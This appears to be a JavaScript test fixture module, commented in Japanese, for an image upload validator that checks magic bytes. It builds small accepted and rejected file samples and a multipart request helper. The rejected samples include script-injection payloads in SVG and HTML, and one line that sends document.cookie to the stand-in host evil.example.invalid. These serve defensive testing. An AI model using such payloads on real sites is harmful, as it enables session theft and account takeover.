/* ================================================================
   テスト用のデータ

   本物の写真は使いません。マジックバイト（ファイル先頭の目印）の判定を
   確かめるのが目的なので、必要最小限のバイト列を自分で組み立てます。
   ================================================================ */

const bytes = (...values) => new Uint8Array(values);

/* 後ろに詰め物を足して、それらしい長さにする */
function pad(head, total = 64){
  const out = new Uint8Array(total);
  out.set(head, 0);
  for (let i = head.length; i < total; i++) out[i] = i & 0xFF;
  return out;
}

/* --- 通る想定のもの --- */
export const JPEG_BYTES = pad(bytes(0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46));
export const PNG_BYTES  = pad(bytes(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                                    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52));
export const WEBP_BYTES = pad(bytes(0x52, 0x49, 0x46, 0x46, 0x28, 0x00, 0x00, 0x00,  /* "RIFF" + size */
                                    0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x20)); /* "WEBP" + "VP8 " */

/* --- 拒否される想定のもの --- */
export const SVG_BYTES  = new TextEncoder().encode(
  `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`);
export const SVG_XML_BYTES = new TextEncoder().encode(
  `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`);
export const HTML_BYTES = new TextEncoder().encode(
  `<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html>`);
export const JS_BYTES   = new TextEncoder().encode(
  `(function(){ fetch("https://evil.example.invalid/?c="+document.cookie); })();`);
export const GIF_BYTES  = pad(bytes(0x47, 0x49, 0x46, 0x38, 0x39, 0x61)); /* GIF89a */
export const AVIF_BYTES = pad(bytes(0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70,
                                    0x61, 0x76, 0x69, 0x66)); /* ....ftypavif */
export const ZIP_BYTES  = pad(bytes(0x50, 0x4B, 0x03, 0x04));
export const PDF_BYTES  = pad(bytes(0x25, 0x50, 0x44, 0x46, 0x2D)); /* %PDF- */
/* "RIFF" だけで "WEBP" が続かないもの（WAV など） */
export const RIFF_ONLY_BYTES = pad(bytes(0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00,
                                         0x57, 0x41, 0x56, 0x45)); /* "WAVE" */
export const EMPTY_BYTES = new Uint8Array(0);

/* --- multipart リクエストの組み立て --- */
/**
 * @param {object} opts
 *   fileBytes    … 送るバイト列（null なら file フィールドを付けない）
 *   fileType     … 申告する Content-Type（null なら付けない）
 *   fileName     … 申告するファイル名
 *   category     … category フィールドの値
 *   omitCategory … true なら category フィールドそのものを付けない
 *   extraFields  … 追加のフィールド（攻撃の再現用）
 */
export function makeUploadRequest(opts = {}){
  const {
    fileBytes = JPEG_BYTES,
    fileType = "image/jpeg",
    fileName = "photo.jpg",
    category = "gallery",
    omitCategory = false,
    extraFields = null,
    method = "POST",
    url = "http://localhost:8787/api/media/upload"
  } = opts;

  const form = new FormData();
  if (fileBytes !== null) {
    const blob = fileType == null
      ? new Blob([fileBytes])
      : new Blob([fileBytes], { type: fileType });
    form.append("file", blob, fileName);
  }
  if (!omitCategory) form.append("category", category);
  if (extraFields) for (const [k, v] of Object.entries(extraFields)) form.append(k, v);

  return new Request(url, { method, body: form });
}
